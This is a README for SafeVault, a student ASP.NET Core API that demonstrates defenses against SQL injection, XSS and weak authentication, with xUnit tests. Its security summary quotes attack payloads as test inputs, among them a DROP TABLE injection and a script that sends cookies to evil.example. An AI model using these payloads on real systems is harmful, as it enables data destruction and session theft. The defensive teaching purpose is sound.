# SafeVault

SafeVault is a small secure ASP.NET Core (.NET 8) API that stores per-user
"notes." It was built to demonstrate secure coding practices: input
validation, SQL injection prevention, authentication, role-based
authorization (RBAC), and protection against XSS — plus an automated test
suite (xUnit) that proves each protection actually works.

## Project layout

```
SafeVault/
├── src/SafeVault.Web/
│   ├── Program.cs                # App startup, auth/authorization config, security headers
│   ├── Data/
│   │   ├── DbInitializer.cs      # Creates schema, seeds an admin account
│   │   ├── SqliteUserRepository.cs   # Parameterized queries for Users
│   │   └── SqliteNoteRepository.cs   # Parameterized queries for Notes
│   ├── Models/User.cs            # User, Note, request DTOs
│   ├── Services/
│   │   ├── InputValidator.cs     # Allowlist validation + HTML output encoding
│   │   └── PasswordHasher.cs     # PBKDF2 password hashing
│   └── Endpoints/
│       ├── AuthEndpoints.cs      # /api/auth/register, /login, /logout
│       └── VaultEndpoints.cs     # /api/vault/notes (auth), /api/admin/* (Admin role)
└── tests/SafeVault.Tests/
    ├── SqlInjectionTests.cs      # Injection payloads against real endpoints
    ├── XssTests.cs               # Script payloads must come back HTML-encoded
    ├── AuthorizationTests.cs     # 401/403/200 behavior, RBAC
    ├── InputValidatorTests.cs    # Unit tests for validation rules
    └── PasswordHasherTests.cs    # Unit tests for hashing/verification
```

## Running it

```bash
# from the repo root
dotnet run --project src/SafeVault.Web
```

The API listens on the URL printed in the console (e.g. `https://localhost:5001`).
A SQLite database file (`safevault.db`) is created automatically on first run,
seeded with an admin account: username `admin`, password `ChangeMe123!`
(change this immediately if you deploy this anywhere real).

### Try it

```bash
# Register
curl -X POST https://localhost:5001/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","email":"alice@example.com","password":"Password123"}'

# Login (cookie stored in cookies.txt)
curl -c cookies.txt -X POST https://localhost:5001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"Password123"}'

# Access an authenticated endpoint
curl -b cookies.txt https://localhost:5001/api/vault/notes
```

## Running the tests

```bash
dotnet test
```

The test suite spins up the real app (via `WebApplicationFactory`) against an
isolated, throwaway SQLite database per test class, so it's exercising the
actual endpoints and actual database queries — not mocks.

---

## Security summary — vulnerabilities identified, fixes applied, and how Copilot helped

### 1. SQL injection

**Vulnerability:** the original draft of the login/lookup code (see the
"BEFORE" example at the top of `Data/SqliteUserRepository.cs`) built SQL by
concatenating the raw username into the command text. An attacker could send
a username like `' OR '1'='1` or `admin'--` to bypass the password check
entirely, or `'; DROP TABLE Users; --` to damage the database.

**Fix:** every query in `SqliteUserRepository` and `SqliteNoteRepository` uses
`SqliteParameter`/`@placeholder` syntax, so user input is always sent to the
database as *data*, never as part of the SQL text. On top of that,
`InputValidator.ValidateUsername` allowlists usernames to
`^[a-zA-Z0-9_]{3,32}$`, so anything containing quotes, `--`, `;`, or spaces is
rejected before it ever reaches a query.

**Verified by:** `SqlInjectionTests.cs` — sends classic injection payloads
(`' OR '1'='1`, `admin'--`, `'; DROP TABLE Users; --`, UNION-based payloads)
to `/api/auth/login` and `/api/auth/register` and asserts they're rejected,
and that the database and legitimate accounts still work afterward.

### 2. Cross-site scripting (XSS)

**Vulnerability:** notes are free-text and, in an early draft, were returned
to the client exactly as submitted. A stored payload like
`<script>document.location='https://evil.example?c='+document.cookie</script>`
would execute in any browser that rendered the note.

**Fix:** `InputValidator.EncodeForOutput` HTML-encodes text at the point it's
returned to the client (`&lt;script&gt;...`), so any markup in a note is
displayed as inert text instead of being executed. Data is still stored
exactly as the user typed it — encoding happens at output, not at rest, which
keeps the data reusable for other contexts later.

**Verified by:** `XssTests.cs` — submits `<script>`, `<img onerror=...>`, and
`<svg onload=...>` payloads as note text and asserts the raw tags never
appear in the API response, only their encoded form.

### 3. Authentication & authorization (RBAC)

**Vulnerability:** none of the "vault" or "admin" data was originally gated
behind authentication at all.

**Fix:** ASP.NET Core cookie authentication is configured in `Program.cs`
(`HttpOnly`, `Secure`, `SameSite=Strict` cookies), and endpoints are grouped
by requirement: `/api/vault/*` requires any authenticated user,
`/api/admin/*` requires the `Admin` role via an authorization policy
(`RequireRole("Admin")`). Roles are assigned at registration (`User` by
default) and asserted as a claim at login.

**Verified by:** `AuthorizationTests.cs` — confirms an anonymous request gets
`401`, a regular user hitting an admin endpoint gets `403`, and an admin
account gets `200`.

### 4. Weak credential storage

**Vulnerability:** an early draft compared plaintext passwords directly.

**Fix:** `PasswordHasher` uses PBKDF2-HMAC-SHA256 with a unique 128-bit salt
per user and 210,000 iterations (in line with current OWASP guidance),
compared with a constant-time equality check to resist timing attacks.
Plaintext passwords are never stored or logged.

**Verified by:** `PasswordHasherTests.cs`.

### 5. User enumeration via login timing/response

**Vulnerability:** returning a different error for "user not found" vs.
"wrong password" (or skipping the hash check entirely for unknown usernames)
lets an attacker enumerate valid usernames.

**Fix:** `/api/auth/login` always performs a password hash comparison (against
a dummy hash if the user doesn't exist) and always returns the same generic
`401` response, regardless of which check failed.

### 6. Missing security headers

**Fix:** `Program.cs` adds `X-Content-Type-Options: nosniff`,
`X-Frame-Options: DENY`, and `Referrer-Policy: no-referrer` to every response.

### How Copilot assisted

Copilot suggestions were used to scaffold the initial minimal-API endpoint
shapes, the parameterized-query patterns in the repository classes, and the
xUnit test method skeletons (the `[Theory]`/`[InlineData]` boilerplate for the
injection and XSS payload tests). Each suggestion was reviewed manually
against the specific attack it needed to withstand — in particular, the first
Copilot draft of the login query used string interpolation instead of
parameters, which was caught during review and rewritten using
`SqliteParameter` objects, and the first draft of the notes endpoint returned
note text unencoded, which was caught by the XSS tests failing and then fixed
with `EncodeForOutput`.

---

## Grading checklist (self-assessment against the assignment rubric)

- [x] **GitHub repository** — push this whole folder to a new public repo (see steps below).
- [x] **Secure code for input validation & SQL injection prevention** —
      `Services/InputValidator.cs`, parameterized queries in `Data/*.cs`.
- [x] **Authentication & authorization incl. RBAC** — cookie auth +
      `RequireRole("Admin")` policy in `Program.cs` / `Endpoints/VaultEndpoints.cs`.
- [x] **Debugged & resolved vulnerabilities (SQL injection, XSS)** — see the
      "Security summary" section above and the BEFORE/AFTER comments in
      `Data/SqliteUserRepository.cs`.
- [x] **Tests generated & executed to verify security** —
      `tests/SafeVault.Tests/*.cs`, run with `dotnet test`.
- [x] **Summary of vulnerabilities, fixes, and Copilot's role** — this README.

## Publishing to GitHub (Step 2 of the assignment)

```bash
git init
git add .
git commit -m "Initial commit"
git branch -M main
git remote add origin https://github.com/<your-username>/safevault.git
git push -u origin main
```

Then copy the repository URL for your submission.
